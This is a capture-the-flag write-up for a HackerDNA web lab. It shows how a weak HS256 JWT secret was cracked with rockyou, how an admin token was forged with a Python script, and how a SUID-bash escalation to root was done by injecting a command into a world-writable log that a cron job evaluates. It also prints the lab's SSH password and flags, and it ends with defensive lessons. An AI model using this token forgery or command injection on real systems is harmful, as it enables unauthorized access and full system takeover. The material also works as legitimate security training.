---
layout: post
title: "Infiltrator - JWT Secret Cracking to Admin Panel to Root"
description: "CTF writeup cracking an HS256 JWT secret from rockyou to forge an admin token, leaking SSH credentials from the admin page, then escalating to root by injecting commands into a world-writable log file that a cron job evals."
category: hackerdna
tags: [web, ctf, hackerdna, jwt, hmac, cracking, privesc, ssh, log-injection]
---

## Infiltrator - CTF Writeup

**Category:** WEB | **Flags:** 2 (User / Root)

Challenge: [https://hackerdna.com/labs/infiltrator](https://hackerdna.com/labs/infiltrator)

## Contents

- [Reconnaissance](#reconnaissance)
- [Cracking the JWT Secret](#cracking-the-jwt-secret)
- [Forging an Admin Token](#forging-an-admin-token)
- [SSH & User Flag](#ssh--user-flag)
- [Privilege Escalation to Root](#privilege-escalation-to-root)

## Reconnaissance

The target exposes a Flask web app on port 80 with JWT-based auth. A normal
user (e.g. `user/password123`) signs in and receives a signed JWT that is
stored in a cookie. The app has a `/dashboard` for ordinary users and an
`/admin` endpoint that only lets through tokens with `role=admin`:

```
GET /admin HTTP/1.1
Cookie: token=eyJ...
```

The JWT header indicates HS256:

```
{"alg": "HS256", "typ": "JWT"}
```

## Cracking the JWT Secret

HS256 signs the header+payload with a symmetric secret, so any client can
verify signatures offline. The secret is only as strong as its entropy - if it
is missing from the app source or database, it can be brute-forced from common
password lists. The flag pair lives behind admin access, so the secret is the
key to everything.

I dumped the target token and fed it to a small C HMAC-SHA256 cracker over
`rockyou.txt` (14M passwords):

```bash
./crack_jwt <header>.<payload>.<sig> rockyou.txt /tmp/opencode/hd/rockyou.txt
```

After ~55 seconds the secret surfaced:

```
[+] FOUND: key = '!!!secret!!!'
```

The password `!!!secret!!!` is exactly the kind of key that never shows up in
a small dictionary but sits right inside a full breach corpus.

## Forging an Admin Token

With the secret in hand I forged a token with an elevated role:

```python
import hmac, hashlib, base64, json

def b64(b): return base64.urlsafe_b64encode(b).rstrip(b"=")

header  = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64(json.dumps({"user":"admin","role":"admin","exp":...}).encode())
sig     = b64(hmac.new(b"!!!secret!!!", header + b"." + payload, hashlib.sha256).digest())

token = header + b"." + payload + b"." + sig
```

Presenting this token to `/admin` returns the admin page, which conveniently
prints the SSH credentials for the box:

```
ssh ctf@<ip>
password: gzCxliaIr26MDS3ppbRSnCrNgOcR5ppM
```

## SSH & User Flag

Logging in as `ctf` and reading the user flag:

```bash
sshpass -p 'gzCxliaIr26MDS3ppbRSnCrNgOcR5ppM' ssh ctf@<ip>
cat /home/ctf/user.txt
```

```
USER FLAG: 4ba2f557-c4fb-429e-4a18-89513f62eb25
```

## Privilege Escalation to Root

A script under `/usr/local/bin` (`log_watcher.sh`) is run as root by a cron
job every 30 seconds. Its core logic is dangerously simple:

```bash
while read line; do
    eval "$line"
done < /var/log/custom.log
```

The target file `/var/log/custom.log` is world-writable (`-rw-rw-rw-`). Any
non-empty line written to it gets `eval`'d as a root shell command. That is a
trivial command injection:

```bash
echo '/bin/bash -c "chmod +s /bin/bash"' > /var/log/custom.log
# wait ~30s for the cron cycle
/bin/bash -p
```

A SUID `bash` (or writing an SSH key into `/root/.ssh/authorized_keys`)
confirms root and yields the final flag:

```
ROOT FLAG: 785fe977-4ddd-4fe7-62e7-4c347a4fe172
```

## How the Attack Works

1. **Weak signing key.** HS256 JWTs are only as safe as their secret. A breach
   wordlist cracked `!!!secret!!!` in under a minute.
2. **Stateless claims.** JWTs encode `role` client-side; nobody re-validated
   it server-side, so a forged token opens the admin namespace.
3. **Credential leak in the admin portal.** The admin panel handed over real
   SSH credentials.
4. **eval on world-writable log.** Root trusts the contents of a log file any
   low-priv user can append to, executing every line with `eval`.

## Key Takeaways

- **Sign JWTs with a high-entropy random secret**, not a passphrase from
  `rockyou`.
- **Never derive authorization from client-controllable claims alone** -
  validate roles server-side or use an opaque session.
- **Never `eval` file contents as root**, especially a log that any account
  can write to. Use strict parsers and drop privileges.
- Check world-writable files under logs/tmp that are consumed by root cron
  jobs - it is a classic and reliable privesc primitive.